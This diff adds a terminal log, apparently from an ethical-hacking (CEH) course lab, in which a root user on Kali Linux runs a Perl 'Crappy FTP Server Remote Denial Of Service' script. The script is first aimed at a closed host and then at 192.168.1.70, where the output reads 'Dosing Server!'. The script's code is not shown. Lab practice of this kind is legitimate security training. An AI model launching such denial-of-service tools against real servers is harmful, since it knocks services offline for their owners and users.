@@ -1,0 +1,47 @@
+root@kali:~/Desktop/amit/CEH# lsc
+bash: lsc: command not found
+root@kali:~/Desktop/amit/CEH# ls
+ _config.yml   day1   day10   day2   day3   day4   day5   day6   day7  'day8 (Sniffing)'   day9   Module
+root@kali:~/Desktop/amit/CEH# cd day10
+root@kali:~/Desktop/amit/CEH/day10# ;s
+bash: syntax error near unexpected token `;'
+root@kali:~/Desktop/amit/CEH/day10# ls
+47119  amit.php  Crappyftp.pl  __MACOSX  notepad.txt  Terminal1.txt  terminal2  test.xml
+root@kali:~/Desktop/amit/CEH/day10# chmod +X Crappyftp.pl 
+root@kali:~/Desktop/amit/CEH/day10# perl Crappyftp.pl 
+Crappy FTP Server Remote Denial Of Service
+by coolkaveh
+[email protected]
+usage: perl Crappyftp.pl <host> 
+root@kali:~/Desktop/amit/CEH/day10# ls -l *.pl
+-rw-r--r-- 1 root root 1577 Jul 28 17:05 Crappyftp.pl
+root@kali:~/Desktop/amit/CEH/day10# perl Crappyftp.pl 
+Crappy FTP Server Remote Denial Of Service
+by coolkaveh
+[email protected]
+usage: perl Crappyftp.pl <host> 
+root@kali:~/Desktop/amit/CEH/day10# perl Crappyftp.pl 
+Crappy FTP Server Remote Denial Of Service
+by coolkaveh
+[email protected]
+usage: perl Crappyftp.pl <host> 
+root@kali:~/Desktop/amit/CEH/day10# ls
+47119  amit.php  Crappyftp.pl  __MACOSX  notepad.txt  Terminal1.txt  terminal2  test.xml
+root@kali:~/Desktop/amit/CEH/day10# ls -a
+.  ..  47119  amit.php  Crappyftp.pl  __MACOSX  notepad.txt  Terminal1.txt  terminal2  test.xml
+root@kali:~/Desktop/amit/CEH/day10# chmod +x Crappyftp.pl 
+root@kali:~/Desktop/amit/CEH/day10# ls -l *.pl
+-rwxr-xr-x 1 root root 1577 Jul 28 17:05 Crappyftp.pl
+root@kali:~/Desktop/amit/CEH/day10# perl Crappyftp.pl 
+Crappy FTP Server Remote Denial Of Service
+by coolkaveh
+[email protected]
+usage: perl Crappyftp.pl <host> 
+root@kali:~/Desktop/amit/CEH/day10# perl Crappyftp.pl 192.168.1.170
+192.168.1.170 -> 21 is closed!
+root@kali:~/Desktop/amit/CEH/day10# ^C
+root@kali:~/Desktop/amit/CEH/day10# perl Crappyftp.pl 192.168.1.70
+192.168.1.70 -> 21 is alive.
+Dosing Server!
+
+
